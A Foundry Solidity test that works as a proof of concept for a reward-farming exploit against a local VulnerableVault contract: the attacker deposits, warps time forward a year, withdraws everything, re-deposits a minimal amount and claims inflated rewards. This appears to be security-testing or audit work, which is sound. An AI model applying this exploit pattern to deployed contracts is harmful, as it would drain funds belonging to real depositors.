// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract RewardFarmingExploitTest is Test {
    VulnerableVault target;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy the VulnerableVault contract
        target = new VulnerableVault();
        
        // Fund the attacker and the contract
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 100 ether);
    }
    
    function test_RewardFarmingExploit() public {
        // Step 1: Attacker deposits a significant amount of ETH
        vm.startPrank(attacker);
        target.deposit{value: 5 ether}();
        
        // Fast forward time to accrue rewards
        vm.warp(block.timestamp + 365 days);
        
        // Step 2: Attacker withdraws all ETH
        target.withdrawAll();
        
        // Step 3: Attacker deposits a minimal amount to reactivate reward calculation
        target.deposit{value: 0.1 ether}();
        
        // Step 4: Attacker claims inflated rewards
        uint256 rewardBefore = address(attacker).balance;
        target.claimReward();
        uint256 rewardAfter = address(attacker).balance;
        vm.stopPrank();
        
        // Assert exploit success
        assertGt(rewardAfter, rewardBefore, "Attacker should have received inflated rewards");
    }
}
